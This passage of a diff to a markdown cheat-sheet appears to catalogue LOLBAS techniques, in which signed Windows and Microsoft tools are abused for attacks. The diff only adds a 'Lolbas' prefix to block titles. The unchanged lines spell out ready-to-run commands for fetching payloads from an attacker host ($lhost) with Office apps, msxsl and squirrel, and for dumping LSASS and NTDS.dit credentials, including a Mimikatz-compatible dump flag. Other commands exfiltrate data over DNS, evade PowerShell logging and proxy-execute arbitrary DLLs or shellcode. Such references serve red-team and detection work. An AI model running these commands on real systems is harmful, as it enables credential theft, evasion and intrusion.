 bginfo.exe $file_out /popup /nolicprompt
 ```
 <!-- cheat
@@ -5858,7 +5858,7 @@ Execute VBscript code that is referenced within the specified .bgi file.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Execute VBscript code that is referenced within the specified .bgi file"
+```cmd title:"Lolbas Execute VBscript code that is referenced within the specified .bgi file"
 bginfo.exe $file_out /popup /nolicprompt
 ```
 <!-- cheat
@@ -5871,7 +5871,7 @@ Execute bginfo.exe from a WebDAV server.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Execute bginfo.exe from a WebDAV server"
+```cmd title:"Lolbas Execute bginfo.exe from a WebDAV server"
 \\$lhost\webdav\bginfo.exe $file_out /popup /nolicprompt
 ```
 <!-- cheat
@@ -5885,7 +5885,7 @@ Execute bginfo.exe from a WebDAV server.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Execute bginfo.exe from a WebDAV server"
+```cmd title:"Lolbas Execute bginfo.exe from a WebDAV server"
 \\$lhost\webdav\bginfo.exe $file_out /popup /nolicprompt
 ```
 <!-- cheat
@@ -5899,7 +5899,7 @@ This style of execution may not longer work due to patch.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"This style of execution may not longer work due to patch"
+```cmd title:"Lolbas This style of execution may not longer work due to patch"
 \\live.sysinternals.com\Tools\bginfo.exe \\$lhost\$share\$file /popup /nolicprompt
 ```
 <!-- cheat
@@ -5914,7 +5914,7 @@ This style of execution may not longer work due to patch.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"This style of execution may not longer work due to patch"
+```cmd title:"Lolbas This style of execution may not longer work due to patch"
 \\live.sysinternals.com\Tools\bginfo.exe \\$lhost\$share\$file /popup /nolicprompt
 ```
 <!-- cheat
@@ -5937,7 +5937,7 @@ Launch 64-bit shellcode from the specified .wds file using cdb.exe.
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Launch 64-bit shellcode from the specified .wds file using cdb.exe"
+```cmd title:"Lolbas Launch 64-bit shellcode from the specified .wds file using cdb.exe"
 cdb.exe -cf $file_out -o notepad.exe
 ```
 <!-- cheat
@@ -5950,7 +5950,7 @@ Attaching to any process and executing shell commands.
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Attaching to any process and executing shell commands"
+```cmd title:"Lolbas Attaching to any process and executing shell commands"
 cdb.exe -pd -pn $process_name
 .shell $cmd
 ```
@@ -5965,7 +5965,7 @@ Execute arbitrary commands and binaries using a debugging script (see Resources 
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Execute arbitrary commands and binaries using a debugging script (see Resources section for a…"
+```cmd title:"Lolbas Execute commands with CDB debugging script"
 cdb.exe -c $file_out "$cmd"
 ```
 <!-- cheat
@@ -5987,7 +5987,7 @@ Loads the target .DLL in arbitrary path specified with /L.
 
 *Privileges: User • MITRE: T1055*
 
-```cmd title:"Loads the target .DLL in arbitrary path specified with /L"
+```cmd title:"Lolbas Loads the target .DLL in arbitrary path specified with /L"
 coregen.exe /L $file_out dummy_assembly_name
 ```
 <!-- cheat
@@ -6000,7 +6000,7 @@ Loads the coreclr.dll in the corgen.exe directory (e.g. C:\Program Files\Microso
 
 *Privileges: User • MITRE: T1055*
 
-```cmd title:"Loads the coreclr.dll in the corgen.exe directory (e.g"
+```cmd title:"Lolbas Load coreclr.dll from coregen directory"
 coregen.exe dummy_assembly_name
 ```
 <!-- cheat
@@ -6012,7 +6012,7 @@ Loads the target .DLL in arbitrary path specified with /L. Since binary is signe
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Loads the target .DLL in arbitrary path specified with /L"
+```cmd title:"Lolbas Loads the target .DLL in arbitrary path specified with /L"
 coregen.exe /L $file_out dummy_assembly_name
 ```
 <!-- cheat
@@ -6035,7 +6035,7 @@ Dump process by PID and create a minidump file. If "-f dump.dmp" is not specifie
 
 *Privileges: SYSTEM • MITRE: T1003*
 
-```cmd title:"Dump process by PID and create a minidump file"
+```cmd title:"Lolbas Dump process by PID and create a minidump file"
 createdump.exe -n -f $file_out $pid
 ```
 <!-- cheat
@@ -6057,7 +6057,7 @@ Use csi.exe to run unsigned C# code.
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Use csi.exe to run unsigned C# code"
+```cmd title:"Lolbas Use csi.exe to run unsigned C# code"
 csi.exe $file_out
 ```
 <!-- cheat
@@ -6077,7 +6077,7 @@ Use DefaultPack.EXE to execute arbitrary binaries, with added argument support.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Use DefaultPack.EXE to execute arbitrary binaries, with added argument support"
+```cmd title:"Lolbas Use DefaultPack.EXE to execute arbitrary binaries, with added argument support"
 DefaultPack.EXE /C:"$cmd"
 ```
 <!-- cheat
@@ -6098,7 +6098,7 @@ Downloads an MSI file to C:\Windows\Installer and then installs it.
 
 *Privileges: User • MITRE: T1218.007*
 
-```cmd title:"Downloads an MSI file to C:\Windows\Installer and then installs it"
+```cmd title:"Lolbas Downloads an MSI file to C:\Windows\Installer and then installs it"
 devinit.exe run -t msi-install -i $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -6121,7 +6121,7 @@ The above binary will execute other binary.
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"The above binary will execute other binary"
+```cmd title:"Lolbas The above binary will execute other binary"
 devtoolslauncher.exe LaunchForDeploy $file_out "$cmd" test
 ```
 <!-- cheat
@@ -6135,7 +6135,7 @@ The above binary will execute other binary.
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"The above binary will execute other binary"
+```cmd title:"Lolbas The above binary will execute other binary"
 devtoolslauncher.exe LaunchForDebug $file_out "$cmd" test
 ```
 <!-- cheat
@@ -6157,7 +6157,7 @@ Enabling a forwarded port for locally hosted service at port 8080 to be exposed 
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Enabling a forwarded port for locally hosted service at port 8080 to be exposed on the internet"
+```cmd title:"Lolbas Enabling a forwarded port for locally hosted service at port 8080 to be exposed on the internet"
 devtunnel.exe host -p 8080
 ```
 <!-- cheat
@@ -6176,7 +6176,7 @@ Execute C# code located in the specified folder via 'Program.cs' and 'Project.js
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Execute C# code located in the specified folder via 'Program.cs' and 'Project.json' (Note -…"
+```cmd title:"Lolbas Execute C# project with dnx"
 dnx.exe $dir
 ```
 <!-- cheat
@@ -6196,7 +6196,7 @@ dotnet.exe will execute any DLL even if applocker is enabled.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"dotnet.exe will execute any DLL even if applocker is enabled"
+```cmd title:"Lolbas dotnet.exe will execute any DLL even if applocker is enabled"
 dotnet.exe $file_out
 ```
 <!-- cheat
@@ -6209,7 +6209,7 @@ dotnet.exe will execute any DLL.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"dotnet.exe will execute any DLL"
+```cmd title:"Lolbas dotnet.exe will execute any DLL"
 dotnet.exe $file_out
 ```
 <!-- cheat
@@ -6222,7 +6222,7 @@ dotnet.exe will open a console which allows for the execution of arbitrary F# co
 
 *Privileges: User • MITRE: T1059*
 
-```cmd title:"dotnet.exe will open a console which allows for the execution of arbitrary F# commands"
+```cmd title:"Lolbas dotnet.exe will open a console which allows for the execution of arbitrary F# commands"
 dotnet.exe fsi
 ```
 <!-- cheat
@@ -6234,7 +6234,7 @@ dotnet.exe with msbuild (SDK Version) will execute unsigned code
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"dotnet.exe with msbuild (SDK Version) will execute unsigned code"
+```cmd title:"Lolbas dotnet.exe with msbuild (SDK Version) will execute unsigned code"
 dotnet.exe msbuild $file_out
 ```
 <!-- cheat
@@ -6257,7 +6257,7 @@ dsdbutil supports VSS snapshot creation
 
 *Privileges: Administrator • MITRE: T1003.003*
 
-```cmd title:"dsdbutil supports VSS snapshot creation"
+```cmd title:"Lolbas dsdbutil supports VSS snapshot creation"
 dsdbutil.exe "activate instance ntds" "snapshot" "create" "quit" "quit"
 ```
 <!-- cheat
@@ -6269,7 +6269,7 @@ Mounting the snapshot with its GUID
 
 *Privileges: Administrator • MITRE: T1003.003*
 
-```cmd title:"Mounting the snapshot with its GUID"
+```cmd title:"Lolbas Mounting the snapshot with its GUID"
 dsdbutil.exe "activate instance ntds" "snapshot" "mount $guid" "quit" "quit"
 ```
 <!-- cheat
@@ -6282,7 +6282,7 @@ Deletes the mount of the snapshot
 
 *Privileges: Administrator • MITRE: T1003.003*
 
-```cmd title:"Deletes the mount of the snapshot"
+```cmd title:"Lolbas Deletes the mount of the snapshot"
 dsdbutil.exe "activate instance ntds" "snapshot" "delete $guid" "quit" "quit"
 ```
 <!-- cheat
@@ -6295,7 +6295,7 @@ Mounting with snapshot identifier
 
 *Privileges: Administrator • MITRE: T1003.003*
 
-```cmd title:"Mounting with snapshot identifier"
+```cmd title:"Lolbas Mounting with snapshot identifier"
 dsdbutil.exe "activate instance ntds" "snapshot" "create" "list all" "mount 1" "quit" "quit"
 ```
 <!-- cheat
@@ -6307,7 +6307,7 @@ Deletes the mount of the snapshot
 
 *Privileges: Administrator • MITRE: T1003.003*
 
-```cmd title:"Deletes the mount of the snapshot"
+```cmd title:"Lolbas Deletes the mount of the snapshot"
 dsdbutil.exe "activate instance ntds" "snapshot" "list all" "delete 1" "quit" "quit"
 ```
 <!-- cheat
@@ -6327,7 +6327,7 @@ Copy file from source to destination
 
 *Privileges: Administrator • MITRE: T1105*
 
-```cmd title:"Copy file from source to destination"
+```cmd title:"Lolbas Copy file from source to destination"
 dtutil.exe /FILE $file_out /COPY FILE;$file_out
 ```
 <!-- cheat
@@ -6347,7 +6347,7 @@ Creates a memory dump of the LSASS process.
 
 *Privileges: Administrator • MITRE: T1003.001*
 
-```cmd title:"Creates a memory dump of the LSASS process"
+```cmd title:"Lolbas Creates a memory dump of the LSASS process"
 dump64.exe $pid out.dmp
 ```
 <!-- cheat
@@ -6367,7 +6367,7 @@ Creates a memory dump of the lsass process
 
 *Privileges: Administrator • MITRE: T1003.001*
 
-```cmd title:"Creates a memory dump of the lsass process"
+```cmd title:"Lolbas Creates a memory dump of the lsass process"
 DumpMinitool.exe --file $file_out --processId 1132 --dumpType Full
 ```
 <!-- cheat
@@ -6388,7 +6388,7 @@ Launch specified executable as a subprocess of dxcap.exe. Note that you should h
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Launch specified executable as a subprocess of dxcap.exe"
+```cmd title:"Lolbas Launch specified executable as a subprocess of dxcap.exe"
 Dxcap.exe -c $file_out
 ```
 <!-- cheat
@@ -6401,7 +6401,7 @@ Once executed, `dxcap.exe` will execute `xperf.exe` in the same folder. Thus, if
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Once executed, dxcap.exe will execute xperf.exe in the same folder"
+```cmd title:"Lolbas Once executed, dxcap.exe will execute xperf.exe in the same folder"
 dxcap.exe -usage
 ```
 <!-- cheat
@@ -6425,7 +6425,7 @@ Downloads payload from remote server
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads payload from remote server"
+```cmd title:"Lolbas Downloads payload from remote server"
 ECMangen.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -6462,7 +6462,7 @@ Downloads payload from remote server
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads payload from remote server"
+```cmd title:"Lolbas Downloads payload from remote server"
 Excel.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -6486,7 +6486,7 @@ Execute F# code via script file
 
 *Privileges: User • MITRE: T1059*
 
-```cmd title:"Execute F# code via script file"
+```cmd title:"Lolbas Execute F# code via script file"
 fsi.exe $file_out
 ```
 <!-- cheat
@@ -6499,7 +6499,7 @@ Execute F# code via interactive command line
 
 *Privileges: User • MITRE: T1059*
 
-```cmd title:"Execute F# code via interactive command line"
+```cmd title:"Lolbas Execute F# code via interactive command line"
 fsi.exe
 ```
 <!-- cheat
@@ -6518,7 +6518,7 @@ Execute F# code via script file
 
 *Privileges: User • MITRE: T1059*
 
-```cmd title:"Execute F# code via script file"
+```cmd title:"Lolbas Execute F# code via script file"
 fsianycpu.exe $file_out
 ```
 <!-- cheat
@@ -6531,7 +6531,7 @@ Execute F# code via interactive command line
 
 *Privileges: User • MITRE: T1059*
 
-```cmd title:"Execute F# code via interactive command line"
+```cmd title:"Lolbas Execute F# code via interactive command line"
 fsianycpu.exe
 ```
 <!-- cheat
@@ -6551,7 +6551,7 @@ Launches an executable via Visual Studio command line utility.
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Launches an executable via Visual Studio command line utility"
+```cmd title:"Lolbas Launches an executable via Visual Studio command line utility"
 IntelliTrace.exe launch /cp:"collectionplan.xml" /f:"c:\users\public\log" "C:\Windows\System32\calc.exe"
 ```
 <!-- cheat
@@ -6573,7 +6573,7 @@ Executes the command specified after the `RUN` parameter as a child of `logger.e
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Executes the command specified after the RUN parameter as a child of logger.exe"
+```cmd title:"Lolbas Executes the command specified after the RUN parameter as a child of logger.exe"
 logger.exe RUN "$cmd"
 ```
 <!-- cheat
@@ -6586,7 +6586,7 @@ Executes the command specified after the `RUNW` parameter as a child of `logger.
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Executes the command specified after the RUNW parameter as a child of logger.exe"
+```cmd title:"Lolbas Executes the command specified after the RUNW parameter as a child of logger.exe"
 logger.exe RUNW "$cmd"
 ```
 <!-- cheat
@@ -6599,7 +6599,7 @@ Executes the command specified as a child of `logger.exe`.
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Executes the command specified as a child of logger.exe"
+```cmd title:"Lolbas Executes the command specified as a child of logger.exe"
 logger.exe "$cmd"
 ```
 <!-- cheat
@@ -6622,7 +6622,7 @@ Launch specified executable as a subprocess of Mftrace.exe.
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Launch specified executable as a subprocess of Mftrace.exe"
+```cmd title:"Lolbas Launch specified executable as a subprocess of Mftrace.exe"
 Mftrace.exe $file_out
 ```
 <!-- cheat
@@ -6643,7 +6643,7 @@ Launch specified executable as a subprocess of Microsoft.NodejsTools.PressAnyKey
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Launch specified executable as a subprocess of Microsoft.NodejsTools.PressAnyKey.exe"
+```cmd title:"Lolbas Launch specified executable as a subprocess of Microsoft.NodejsTools.PressAnyKey.exe"
 Microsoft.NodejsTools.PressAnyKey.exe normal 1 $file_out
 ```
 <!-- cheat
@@ -6664,7 +6664,7 @@ Executes a command via MPI command-line tool.
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Executes a command via MPI command-line tool"
+```cmd title:"Lolbas Executes a command via MPI command-line tool"
 mpiexec.exe $cmd
 ```
 <!-- cheat
@@ -6697,7 +6697,7 @@ Downloads payload from remote server
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads payload from remote server"
+```cmd title:"Lolbas Downloads payload from remote server"
 MSAccess.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -6727,7 +6727,7 @@ Launch .bat file via msdeploy.exe.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Launch .bat file via msdeploy.exe"
+```cmd title:"Lolbas Launch .bat file via msdeploy.exe"
 msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="$file_out"
 ```
 <!-- cheat
@@ -6740,7 +6740,7 @@ Launch .bat file via msdeploy.exe.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Launch .bat file via msdeploy.exe"
+```cmd title:"Lolbas Launch .bat file via msdeploy.exe"
 msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="$file_out"
 ```
 <!-- cheat
@@ -6753,7 +6753,7 @@ Copy file from source to destination.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Copy file from source to destination"
+```cmd title:"Lolbas Copy file from source to destination"
 msdeploy.exe -verb:sync -source:filePath=$file_out -dest:filePath=$file_out
 ```
 <!-- cheat
@@ -6787,7 +6787,7 @@ Downloads payload from remote server
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads payload from remote server"
+```cmd title:"Lolbas Downloads payload from remote server"
 MsoHtmEd.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -6821,7 +6821,7 @@ Downloads payload from remote server
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads payload from remote server"
+```cmd title:"Lolbas Downloads payload from remote server"
 mspub.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -6844,7 +6844,7 @@ Run COM Scriptlet code within the script.xsl file (local).
 
 *Privileges: User • MITRE: T1220*
 
-```cmd title:"Run COM Scriptlet code within the script.xsl file (local)"
+```cmd title:"Lolbas Run COM Scriptlet code within the script.xsl file (local)"
 msxsl.exe $file_out $file_out
 ```
 <!-- cheat
@@ -6857,7 +6857,7 @@ Run COM Scriptlet code within the script.xsl file (local).
 
 *Privileges: User • MITRE: T1220*
 
-```cmd title:"Run COM Scriptlet code within the script.xsl file (local)"
+```cmd title:"Lolbas Run COM Scriptlet code within the script.xsl file (local)"
 msxsl.exe $file_out $file_out
 ```
 <!-- cheat
@@ -6870,7 +6870,7 @@ Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
 
 *Privileges: User • MITRE: T1220*
 
-```cmd title:"Run COM Scriptlet code within the shellcode.xml(xsl) file (remote)"
+```cmd title:"Lolbas Run COM Scriptlet code within the shellcode.xml(xsl) file (remote)"
 msxsl.exe $scheme://$lhost:$lport/$file $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -6886,7 +6886,7 @@ Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
 
 *Privileges: User • MITRE: T1220*
 
-```cmd title:"Run COM Scriptlet code within the shellcode.xml(xsl) file (remote)"
+```cmd title:"Lolbas Run COM Scriptlet code within the shellcode.xml(xsl) file (remote)"
 msxsl.exe $scheme://$lhost:$lport/$file $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -6902,7 +6902,7 @@ Using remote XML and XSL files, save the transformed XML file to disk.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Using remote XML and XSL files, save the transformed XML file to disk"
+```cmd title:"Lolbas Using remote XML and XSL files, save the transformed XML file to disk"
 msxsl.exe $scheme://$lhost:$lport/$file $scheme://$lhost:$lport/$file -o $file_out
 ```
 <!-- cheat
@@ -6919,7 +6919,7 @@ Using remote XML and XSL files, save the transformed XML file to an Alternate Da
 
 *Privileges: User • MITRE: T1564*
 
-```cmd title:"Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS)"
+```cmd title:"Lolbas Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS)"
 msxsl.exe $scheme://$lhost:$lport/$file $scheme://$lhost:$lport/$file -o $file_out:ads-name
 ```
 <!-- cheat
@@ -6944,7 +6944,7 @@ Start capture on all network adapters and save to specified .cap (circular) file
 
 *Privileges: Administrator • MITRE: T1040*
 
-```cmd title:"Start capture on all network adapters and save to specified .cap (circular) file"
+```cmd title:"Lolbas Start capture on all network adapters and save to specified .cap (circular) file"
 nmcap.exe /network * /capture /file $file_out
 ```
 <!-- cheat
@@ -6964,7 +6964,7 @@ Dump NTDS.dit into folder
 
 *Privileges: Administrator • MITRE: T1003.003*
 
-```cmd title:"Dump NTDS.dit into folder"
+```cmd title:"Lolbas Dump NTDS.dit into folder"
 ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
 ```
 <!-- cheat
@@ -6986,7 +6986,7 @@ Launches command through the debugging process; optionally add `-G` to exit the 
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Launches command through the debugging process; optionally add -G to exit the debugger automatically"
+```cmd title:"Lolbas Launches command through the debugging process; optionally add -G to exit the debugger automatically"
 ntsd.exe -g $cmd
 ```
 <!-- cheat
@@ -7009,7 +7009,7 @@ Execute specified process with OpenConsole.exe as parent process
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Execute specified process with OpenConsole.exe as parent process"
+```cmd title:"Lolbas Execute specified process with OpenConsole.exe as parent process"
 OpenConsole.exe $file_out
 ```
 <!-- cheat
@@ -7030,7 +7030,7 @@ Launches an executable via PIX command-line utility.
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Launches an executable via PIX command-line utility"
+```cmd title:"Lolbas Launches an executable via PIX command-line utility"
 pixtool.exe launch $file_out
 ```
 <!-- cheat
@@ -7064,7 +7064,7 @@ Downloads payload from remote server
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads payload from remote server"
+```cmd title:"Lolbas Downloads payload from remote server"
 Powerpnt.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -7089,7 +7089,7 @@ Loads the specified DLL where DLL is configured with a 'MiniDumpCallbackRoutine'
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Loads the specified DLL where DLL is configured with a 'MiniDumpCallbackRoutine' exported function"
+```cmd title:"Lolbas Loads the specified DLL where DLL is configured with a 'MiniDumpCallbackRoutine' exported function"
 procdump.exe -md $file_out explorer.exe
 ```
 <!-- cheat
@@ -7102,7 +7102,7 @@ Loads the specified DLL where configured with DLL_PROCESS_ATTACH execution, proc
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Loads the specified DLL where configured with DLL_PROCESS_ATTACH execution, process argument can be…"
+```cmd title:"Lolbas Procdump.exe Execute #2"
 procdump.exe -md $file_out foobar
 ```
 <!-- cheat
@@ -7129,7 +7129,7 @@ Downloads payload from remote server
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads payload from remote server"
+```cmd title:"Lolbas Downloads payload from remote server"
 ProtocolHandler.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -7152,7 +7152,7 @@ Use embedded C# within the csx script to execute the code.
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Use embedded C# within the csx script to execute the code"
+```cmd title:"Lolbas Use embedded C# within the csx script to execute the code"
 rcsi.exe $file_out
 ```
 <!-- cheat
@@ -7165,7 +7165,7 @@ Use embedded C# within the csx script to execute the code.
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Use embedded C# within the csx script to execute the code"
+```cmd title:"Lolbas Use embedded C# within the csx script to execute the code"
 rcsi.exe $file_out
 ```
 <!-- cheat
@@ -7186,7 +7186,7 @@ Spawns specified executable as a child process of remote.exe
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Spawns specified executable as a child process of remote.exe"
+```cmd title:"Lolbas Spawns specified executable as a child process of remote.exe"
 Remote.exe /s $file_out anythinghere
 ```
 <!-- cheat
@@ -7199,7 +7199,7 @@ Spawns specified executable as a child process of remote.exe
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Spawns specified executable as a child process of remote.exe"
+```cmd title:"Lolbas Spawns specified executable as a child process of remote.exe"
 Remote.exe /s $file_out anythinghere
 ```
 <!-- cheat
@@ -7212,7 +7212,7 @@ Run a remote file
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Run a remote file"
+```cmd title:"Lolbas Run a remote file"
 Remote.exe /s \\$lhost\$share\$file anythinghere
 ```
 <!-- cheat
@@ -7236,7 +7236,7 @@ Dump process by PID and create a dump file (Appears to create a dump file called
 
 *Privileges: Administrator • MITRE: T1003*
 
-```cmd title:"Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp)"
+```cmd title:"Lolbas Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp)"
 sqldumper.exe 464 0 0x0110
 ```
 <!-- cheat
@@ -7248,7 +7248,7 @@ sqldumper.exe 464 0 0x0110
 
 *Privileges: Administrator • MITRE: T1003.001*
 
-```cmd title:"0x01100:40 flag will create a Mimikatz compatible dump file"
+```cmd title:"Lolbas 0x01100:40 flag will create a Mimikatz compatible dump file"
 sqldumper.exe 540 0 0x01100:40
 ```
 <!-- cheat
@@ -7271,7 +7271,7 @@ Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging"
+```cmd title:"Lolbas Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging"
 Sqlps.exe -noprofile
 ```
 <!-- cheat
@@ -7290,7 +7290,7 @@ Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging"
+```cmd title:"Lolbas Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging"
 SQLToolsPS.exe -noprofile -command Start-Process $file_out
 ```
 <!-- cheat
@@ -7310,7 +7310,7 @@ The above binary will go to url and look for RELEASES file and download the nuge
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"The above binary will go to url and look for RELEASES file and download the nuget package"
+```cmd title:"Lolbas The above binary will go to url and look for RELEASES file and download the nuget package"
 squirrel.exe --download $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -7326,7 +7326,7 @@ The above binary will go to url and look for RELEASES file, download and install
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"The above binary will go to url and look for RELEASES file, download and install the nuget package"
+```cmd title:"Lolbas The above binary will go to url and look for RELEASES file, download and install the nuget package"
 squirrel.exe --update $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -7342,7 +7342,7 @@ The above binary will go to url and look for RELEASES file, download and install
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"The above binary will go to url and look for RELEASES file, download and install the nuget package"
+```cmd title:"Lolbas The above binary will go to url and look for RELEASES file, download and install the nuget package"
 squirrel.exe --update $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -7358,7 +7358,7 @@ The above binary will go to url and look for RELEASES file, download and install
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"The above binary will go to url and look for RELEASES file, download and install the nuget package"
+```cmd title:"Lolbas The above binary will go to url and look for RELEASES file, download and install the nuget package"
 squirrel.exe --updateRollback=$scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -7374,7 +7374,7 @@ The above binary will go to url and look for RELEASES file, download and install
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"The above binary will go to url and look for RELEASES file, download and install the nuget package"
+```cmd title:"Lolbas The above binary will go to url and look for RELEASES file, download and install the nuget package"
 squirrel.exe --updateRollback=$scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -7397,7 +7397,7 @@ Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) f
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file"
+```cmd title:"Lolbas Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file"
 te.exe $file_out
 ```
 <!-- cheat
@@ -7410,7 +7410,7 @@ Execute commands from a DLL file with Test Authoring and Execution Framework (TA
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Execute commands from a DLL file with Test Authoring and Execution Framework (TAEF) tests"
+```cmd title:"Lolbas Execute commands from a DLL file with Test Authoring and Execution Framework (TAEF) tests"
 te.exe $file_out
 ```
 <!-- cheat
@@ -7430,7 +7430,7 @@ Generate JavaScript payload and package.json, and save to "%LOCALAPPDATA%\\Micro
 
 *Privileges: User • MITRE: T1218.015*
 
-```cmd title:"Generate JavaScript payload and package.json, and save to…"
+```cmd title:"Lolbas Teams.exe Execute #1"
 teams.exe
 ```
 <!-- cheat
@@ -7442,7 +7442,7 @@ Generate JavaScript payload and package.json, archive in ASAR file and save to "
 
 *Privileges: User • MITRE: T1218.015*
 
-```cmd title:"Generate JavaScript payload and package.json, archive in ASAR file and save to…"
+```cmd title:"Lolbas Teams.exe Execute #2"
 teams.exe
 ```
 <!-- cheat
@@ -7454,7 +7454,7 @@ Teams spawns cmd.exe as a child process of teams.exe and executes the ping comma
 
 *Privileges: User • MITRE: T1218.015*
 
-```cmd title:"Teams spawns cmd.exe as a child process of teams.exe and executes the ping command"
+```cmd title:"Lolbas Teams spawns cmd.exe as a child process of teams.exe and executes the ping command"
 teams.exe --disable-gpu-sandbox --gpu-launcher="$cmd &&"
 ```
 <!-- cheat
@@ -7474,7 +7474,7 @@ Sends DNS query for open connection to any host, enabling exfiltration over DNS
 
 *Privileges: User • MITRE: T1048*
 
-```cmd title:"Sends DNS query for open connection to any host, enabling exfiltration over DNS"
+```cmd title:"Lolbas Sends DNS query for open connection to any host, enabling exfiltration over DNS"
 TestWindowRemoteAgent.exe start -h $your_base64_data.example.com -p 8000
 ```
 <!-- cheat
@@ -7494,7 +7494,7 @@ Use tracker.exe to proxy execution of an arbitrary DLL into another process. Sin
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Use tracker.exe to proxy execution of an arbitrary DLL into another process"
+```cmd title:"Lolbas Use tracker.exe to proxy execution of an arbitrary DLL into another process"
 Tracker.exe /d $file_out /c C:\Windows\write.exe
 ```
 <!-- cheat
@@ -7507,7 +7507,7 @@ Use tracker.exe to proxy execution of an arbitrary DLL into another process. Sin
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Use tracker.exe to proxy execution of an arbitrary DLL into another process"
+```cmd title:"Lolbas Use tracker.exe to proxy execution of an arbitrary DLL into another process"
 Tracker.exe /d $file_out /c C:\Windows\write.exe
 ```
 <!-- cheat
@@ -7527,7 +7527,7 @@ The above binary will go to url and look for RELEASES file and download the nuge
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"The above binary will go to url and look for RELEASES file and download the nuget package"
